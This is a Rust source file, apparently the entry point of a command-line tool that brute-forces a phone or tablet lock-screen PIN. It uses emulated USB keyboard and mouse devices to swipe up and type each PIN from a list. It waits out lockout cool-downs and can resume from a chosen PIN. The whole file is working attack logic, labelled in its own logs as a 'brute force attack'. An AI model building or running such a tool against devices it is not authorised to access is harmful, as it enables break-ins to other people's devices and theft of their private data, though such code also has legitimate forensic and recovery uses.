use clap::Parser;
use common::{parse_cli_args, Cli, Commands, ResumeArgs, Settings};
use crossterm::{cursor, terminal, ExecutableCommand, QueueableCommand};
use log::{debug, error, info, trace, warn, LevelFilter};
use simplelog::{CombinedLogger, SharedLogger, SimpleLogger, WriteLogger};
use std::fs::OpenOptions;
use std::{io::stdout, process::exit, slice::Iter, thread, time::Duration};

mod common;
mod hid;
mod pin_lists;
mod timeout;

fn main() {
    let cli = Cli::parse();
    configure_logging(&cli.verbose, &cli.log_file_path);

    info!("Starting app...");

    ctrlc::set_handler(move || {
        // Ensure the cursor is visible before exiting
        stdout()
            .queue(terminal::Clear(terminal::ClearType::FromCursorDown))
            .unwrap()
            .queue(cursor::MoveToColumn(0))
            .unwrap()
            .execute(cursor::Show)
            .unwrap();
        error!("Received a signal indicating termination, exiting...");
        exit(1);
    })
    .expect("Error setting Ctrl-C handler");

    let settings = parse_cli_args(&cli);
    trace!("Loaded settings: {:?}", settings);

    match &cli.command {
        Some(Commands::Start) => start(settings),
        Some(Commands::Resume(args)) => resume(settings, args),
        None => {
            error!("No command provided. Use --help for usage information.");
            exit(1);
        }
    }

    debug!("Finished app...");
}

fn configure_logging(verbosity: &Option<u8>, file_path: &Option<String>) {
    let log_level = match verbosity {
        Some(0) => LevelFilter::Info,
        Some(1) => LevelFilter::Debug,
        _ => LevelFilter::Trace,
    };

    let mut loggers: Vec<Box<dyn SharedLogger>> = Vec::new();
    loggers.push(SimpleLogger::new(log_level, simplelog::Config::default()));

    if let Some(log_file_path) = file_path {
        loggers.push(WriteLogger::new(
            log_level,
            simplelog::Config::default(),
            OpenOptions::new()
                .create(true)
                .write(true)
                .append(true)
                .open(log_file_path)
                .unwrap(),
        ));
    }

    CombinedLogger::init(loggers).unwrap();
}

fn start(settings: Settings) {
    info!("Starting brute force attack...");

    start_brute_forcing(&settings, settings.pin_list.iter());
}

fn resume(settings: Settings, args: &ResumeArgs) {
    info!("Resuming brute force attack from pin: {}", args.pin);

    let pin_list_start = settings.pin_list.iter().position(|&pin| pin == args.pin);
    let pin_list = match pin_list_start {
        Some(i) => &settings.pin_list[i..],
        None => {
            error!("Pin not found in pin list: {}", args.pin);
            exit(1);
        }
    };

    start_brute_forcing(&settings, pin_list.iter());
}

fn start_brute_forcing(settings: &Settings, pin_list: Iter<'_, &str>) {
    let mut cool_down_index = 0;
    let mut cool_down_count = 0;

    for pin in pin_list {
        let mut mouse_result = hid::perform_swipe_up(&settings.mouse_device);
        let mut mouse_attempts = 12;

        while let Err(e) = mouse_result {
            mouse_attempts -= 1;
            warn!("Failed to perform swipe up");
            debug!("Attempts remaining: {}", mouse_attempts);
            trace!("Error: {}", e);

            if mouse_attempts == 0 {
                error!("12 failed attempts over 2 minutes, exiting...");
                exit(126); // Command invoked cannot execute
            }

            // Wait for 10 seconds before trying again
            timeout::set_time_out(Duration::from_secs(10), "Retry swipe up in");

            mouse_result = hid::perform_swipe_up(&settings.mouse_device);
        }

        // Wait for animation to complete
        thread::sleep(Duration::from_secs(1));

        let mut keyboard_result =
            hid::send_string_as_keyboard_scan_codes(&settings.keyboard_device, pin);
        let mut keyboard_attempts = 12;

        while let Err(e) = keyboard_result {
            keyboard_attempts -= 1;
            warn!("Failed to send pin: {}", pin);
            debug!("Attempts remaining: {}", keyboard_attempts);
            trace!("Error: {}", e);

            if keyboard_attempts == 0 {
                error!("12 failed attempts over 2 minutes, exiting...");
                exit(126); // Command invoked cannot execute
            }

            // Wait for 10 seconds before trying again
            timeout::set_time_out(Duration::from_secs(10), "Retry sending pin in");

            keyboard_result =
                hid::send_string_as_keyboard_scan_codes(&settings.keyboard_device, pin);
        }

        timeout::set_time_out(
            settings.cool_down[cool_down_index].duration,
            "Pin attempt cool down ends in",
        );

        if settings.cool_down[cool_down_index].count == -1 {
            continue;
        }

        if cool_down_count != settings.cool_down[cool_down_index].count {
            cool_down_count += 1;
        } else {
            cool_down_index += 1;
            cool_down_count = 0;
        }
    }
}
